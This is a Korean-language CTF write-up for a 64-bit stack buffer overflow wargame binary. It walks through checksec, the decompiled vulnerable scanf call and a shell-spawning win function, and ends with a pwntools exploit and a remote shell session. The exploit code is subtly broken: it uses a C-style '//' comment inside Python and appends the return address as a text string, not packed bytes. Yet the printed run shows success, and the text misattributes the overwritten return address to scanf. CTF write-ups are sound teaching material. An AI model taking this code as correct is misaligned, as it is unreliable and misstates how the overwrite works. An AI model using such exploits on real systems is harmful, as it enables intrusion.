# x64 Buffer Overflow

```c

kimdong@ubuntu  ~/Wargame  file 64bof_basic
64bof_basic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=f36fc5ac99f79e7cfa367880978afc9a5b4367d7, not stripped

kimdong@ubuntu  ~/Wargame  checksec 64bof_basic
[*] '/home/kimdong/Wargame/64bof_basic'
   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
```
이번 바이너리 파일은 64-bit이며, Full RELRO 와 NX bit가 enable 되어있다.<br>

 ```c
 kimdong@ubuntu  ~/Wargame  ./64bof_basic
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
실행시켜보면, 받은 입력값을 Hello와 함께 출력을 시켜주는 형태이다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-110h]
  int v5; // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", &s, envp);
  v5 = strlen(&s);
  printf("Hello %s\n", &s);
  return 0;
}
```
ida로 main문을 확인해보면, scanf로 문자열을 받고 v5에 strlen함수를 통해 s의 길이를 저장한다.<br>
이후에, Hello와 함께 s를 printf로 출력해준다.<br>
s문자열은 scanf함수를 이용하므로, BOF취약점을 사용할 수 있을것으로 보여진다.<br>
scanf함수의 return 주소를 다른 주소로 덮어씌워주면 되는데, 바꿔줄 주소를 찾아보자.<br>

```c
int callMeMaybe()
{
  char *path; // [rsp+0h] [rbp-20h]
  const char *v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  path = "/bin/bash";
  v2 = "-p";
  v3 = 0LL;
  return execve("/bin/bash", &path, 0LL);
}
```
ida로 확인해본 결과 `callMeMaybe`라는 함수가 존재한다.<br>
callMeMaybe는 쉘을 띄워주는 함수로, scanf의 return address를 이 함수의 주소로 바꿔주면 해결가능할 것으로 보인다.<br>
callMeMaybe의 주소는 `0x0000000000400606`이다.
s는 `rbp-0x110`부터 `rbp-0x4`까지로 보인다.<br>
따라서 `rbp-0x110`-`rbp-0x4`-`callMeMaybe의 주소`+0x4 만큼 더비를 채워주고 `callMeMaybe address`를 주면 될것같다.<br>

----
## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3004)
payload = "A"*(0x110+0x8) // buffer 크기 + SFP크기
payload += "0x0000000000400606"
p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python 64bof_basic_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done
[*] Switching to interactive mode
$ ls
flag
main
$ cat flag
HackCTF{}
```
## END !
